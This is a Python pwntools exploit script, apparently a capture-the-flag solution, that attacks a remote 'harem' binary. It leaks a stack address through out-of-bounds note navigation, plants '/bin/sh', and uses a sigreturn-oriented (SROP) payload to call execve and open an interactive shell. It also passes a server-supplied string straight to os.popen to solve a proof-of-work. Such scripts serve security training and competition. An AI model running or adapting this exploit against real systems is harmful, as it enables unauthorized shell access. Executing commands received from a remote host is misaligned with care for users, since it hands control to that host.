#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./harem")

context.binary = exe
context.log_level = "DEBUG"

def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("be.ax", 32564)
	return r

def main():
	r = conn()
	#gdb.attach(r, '''b *0x801a4ac''')

	# Important addresses
	syscall = 0x801a444
	rt_sigreturn = p64(0x000000000801a4ac) # mov eax, 0xf; syscall

	# Proof-of-work
	cmd = str(r.recvline()[15:-1])[2:-1]
	ans = os.popen(cmd).read()
	r.sendlineafter(b"solution", ans)

	# Step 1: Write "/bin/sh" into writeable memory
	for i in range(246): # 256 - 10, gets you to location to write RBP, RIP, and onward in the main() stack frame
		r.sendlineafter(b"> ", b"2")
	# Read off the RBP to use in the sigreturn frame and calculate address of "/bin/sh" string to be written
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b"title: ", b"")
	r.sendlineafter(b"content: ", b"")
	r.sendlineafter(b"> ", b"5")
	r.recvline()
	rbpLeak = int.from_bytes(r.recvline()[23:31], 'little')
	binshPtr = rbpLeak - 0x680 # calculated from RBP - stack address of "/bin/sh" (1st note) in GDB
	binshAddr = binshPtr + 8
	log.info(f"Leaked RBP: {hex(rbpLeak)}")
	log.info(f"Calcuated \"/bin/sh\" location: {hex(binshAddr)}")
	# Go to the location of the 1st note and write in "/bin/sh"
	for i in range(10):
		r.sendlineafter(b"> ", b"2")
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b"title: ", p64(binshAddr) + b"/bin/sh\x00") # Create pointer to the "/bin/sh" string to execute execve()!
	r.sendlineafter(b"content: ", b"")

	# Step 2: Perform SROP
	# Go back to where we can overwrite the RIP
	for i in range(246): # 256 - 10, gets you to location to write RBP, RIP, and onward in the main() stack frame
		r.sendlineafter(b"> ", b"2")
	r.sendlineafter(b"> ", b"3")
	r.recvuntil(b"title: ")
	# Set up sigreturn frame
	frame1 = SigreturnFrame(arch="amd64", kernel="amd64")
	frame1.rax = 59
	frame1.rdi = binshPtr
	frame1.rsi = 0
	frame1.rdx = 0
	frame1.rbp = rbpLeak
	frame1.rsp = rbpLeak
	frame1.rip = syscall
	# Construct the first playload
	payload1 = b"a"*22
	payload1 += rt_sigreturn
	payload1 += bytes(frame1)
	# Deploy the first payload
	r.sendline(b"JUNK")
	r.recvuntil(b"content: ")
	r.sendline(payload1[:128])
	r.sendlineafter(b"> ", b"1")
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b"title: ", payload1[129:161])
	r.sendlineafter(b"content: ", payload1[161:])
	r.sendlineafter(b"> ", b"6")

	r.interactive()


if __name__ == "__main__":
	main()
